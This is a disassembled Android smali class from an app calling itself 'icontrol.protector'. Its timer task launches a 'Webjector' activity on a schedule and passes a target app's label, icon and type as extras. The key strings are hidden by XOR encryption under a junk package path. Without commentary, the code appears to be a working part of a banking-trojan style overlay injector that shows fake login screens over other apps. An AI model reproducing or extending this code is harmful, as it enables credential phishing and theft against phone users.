.class Lcom/icontrol/protector/WorkServices$d$b;
.super Ljava/util/TimerTask;
.source "SourceFile"


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/icontrol/protector/WorkServices$d;->m(Landroid/content/Context;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic e:Landroid/content/Context;

.field final synthetic f:Ljava/lang/String;

.field final synthetic g:Ljava/lang/String;

.field final synthetic h:[B

.field final synthetic i:Landroid/content/Context;

.field final synthetic j:Lcom/icontrol/protector/WorkServices$d;


# direct methods
.method constructor <init>(Lcom/icontrol/protector/WorkServices$d;Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;[BLandroid/content/Context;)V
    .locals 0

    iput-object p1, p0, Lcom/icontrol/protector/WorkServices$d$b;->j:Lcom/icontrol/protector/WorkServices$d;

    iput-object p2, p0, Lcom/icontrol/protector/WorkServices$d$b;->e:Landroid/content/Context;

    iput-object p3, p0, Lcom/icontrol/protector/WorkServices$d$b;->f:Ljava/lang/String;

    iput-object p4, p0, Lcom/icontrol/protector/WorkServices$d$b;->g:Ljava/lang/String;

    iput-object p5, p0, Lcom/icontrol/protector/WorkServices$d$b;->h:[B

    iput-object p6, p0, Lcom/icontrol/protector/WorkServices$d$b;->i:Landroid/content/Context;

    invoke-direct {p0}, Ljava/util/TimerTask;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 5

    new-instance v0, Landroid/content/Intent;

    iget-object v1, p0, Lcom/icontrol/protector/WorkServices$d$b;->e:Landroid/content/Context;

    const-class v2, Lcom/icontrol/protector/Webjector;

    invoke-direct {v0, v1, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const/high16 v1, 0x10000000

    invoke-virtual {v0, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const/high16 v1, 0x10000

    invoke-virtual {v0, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const/4 v1, 0x5

    new-array v2, v1, [B

    fill-array-data v2, :array_0

    const/16 v3, 0x8

    new-array v4, v3, [B

    fill-array-data v4, :array_1

    invoke-static {v2, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    iget-object v4, p0, Lcom/icontrol/protector/WorkServices$d$b;->f:Ljava/lang/String;

    invoke-virtual {v0, v2, v4}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    new-array v1, v1, [B

    fill-array-data v1, :array_2

    new-array v2, v3, [B

    fill-array-data v2, :array_3

    invoke-static {v1, v2}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    iget-object v2, p0, Lcom/icontrol/protector/WorkServices$d$b;->g:Ljava/lang/String;

    invoke-virtual {v0, v1, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    const/4 v1, 0x4

    new-array v2, v1, [B

    fill-array-data v2, :array_4

    new-array v4, v3, [B

    fill-array-data v4, :array_5

    invoke-static {v2, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    iget-object v4, p0, Lcom/icontrol/protector/WorkServices$d$b;->h:[B

    invoke-virtual {v0, v2, v4}, Landroid/content/Intent;->putExtra(Ljava/lang/String;[B)Landroid/content/Intent;

    new-array v1, v1, [B

    fill-array-data v1, :array_6

    new-array v2, v3, [B

    fill-array-data v2, :array_7

    invoke-static {v1, v2}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    const/4 v2, 0x1

    new-array v2, v2, [B

    const/4 v4, 0x0

    aput-byte v4, v2, v4

    new-array v3, v3, [B

    fill-array-data v3, :array_8

    invoke-static {v2, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v1, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    iget-object v1, p0, Lcom/icontrol/protector/WorkServices$d$b;->i:Landroid/content/Context;

    invoke-virtual {v1, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    return-void

    :array_0
    .array-data 1
        -0x22t
        -0x7ft
        0x1et
        -0x65t
        0x59t
    .end array-data

    nop

    :array_1
    .array-data 1
        -0x43t
        -0xct
        0x64t
        -0xet
        0x3dt
        -0x5ft
        -0x6bt
        -0x3ct
    .end array-data

    :array_2
    .array-data 1
        -0x69t
        0x41t
        0x54t
        0x74t
        -0x58t
    .end array-data

    nop

    :array_3
    .array-data 1
        -0x5t
        0x20t
        0x36t
        0x11t
        -0x3ct
        -0x6t
        -0x55t
        0x4et
    .end array-data

    :array_4
    .array-data 1
        0x68t
        0x72t
        -0x23t
        0x11t
    .end array-data

    :array_5
    .array-data 1
        0x1t
        0x11t
        -0x4et
        0x7ft
        -0x25t
        -0xft
        0x4dt
        0x50t
    .end array-data

    :array_6
    .array-data 1
        0x42t
        0x31t
        -0x69t
        0x5bt
    .end array-data

    :array_7
    .array-data 1
        0x36t
        0x48t
        -0x19t
        0x3et
        0x18t
        0x9t
        -0x6dt
        0x5t
    .end array-data

    :array_8
    .array-data 1
        0x75t
        0x1dt
        0x48t
        -0x17t
        -0x29t
        -0x26t
        0x2et
        0x29t
    .end array-data
.end method
